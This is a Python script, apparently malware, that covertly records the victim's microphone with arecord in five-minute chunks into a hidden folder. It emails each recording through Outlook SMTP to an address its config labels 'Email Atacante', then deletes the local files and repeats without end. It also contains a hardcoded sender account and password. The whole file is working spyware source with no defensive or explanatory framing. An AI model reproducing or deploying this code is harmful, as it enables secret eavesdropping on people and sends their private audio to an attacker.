#!/bin/python3.7

global contador
global receiver_email
with open("/usr/bin/config.txt", "r") as cfile:
	config = cfile.read().split('|')
	if config[0] == "empty":
		receiver_email = input("Email Atacante >> ")
	else:
		receiver_email = config[0]
	machine_name = config[1]
	usuario = config[2]
	usuario = usuario.replace('\n','')
cfile.close()

def send_email(file):

	from asyncore import file_dispatcher
	import email
	from json import encoder
	import smtplib
	from email.mime.multipart import MIMEMultipart
	from email.mime.text import MIMEText
	from email.mime.base import MIMEBase
	from email import encoders, message

	sender_email = "sendregistros@outlook.com"

	message = MIMEMultipart()
	message["From"] = sender_email
	message['To'] = receiver_email
	message['Subject'] = "Registro de voz | "+machine_name
	
	attachment = open(file, 'rb')

	obj = MIMEBase('application','octet-stream')
	obj.set_payload((attachment).read())
	encoders.encode_base64(obj)
	obj.add_header('Content-Disposition',"attachment; filename= "+file)

	message.attach(obj)
	my_message = message.as_string()
	email_session = smtplib.SMTP('smtp-mail.outlook.com',587)
	email_session.starttls()
	email_session.login(sender_email,"@3nv14d0rd3r4gi1str0s_1090230@")
	email_session.sendmail(sender_email,receiver_email,my_message)

	email_session.quit()

def create_record():
	import os
	import time as tm
	for a in range(0, 12):
		contador = a+1
		os.system('arecord -d 300 /home/'+usuario+'/.v1kox/ch1s3c/records/archivo'+str(contador)+'.mp3')
		file = "/home/"+usuario+"/.v1kox/ch1s3c/records/archivo"+str(contador)+".mp3"
		send_email(file)
	os.system('rm /home/'+usuario+'/.v1kox/ch1s3c/records/*')
	tm.sleep(120)
	create_record()

create_record()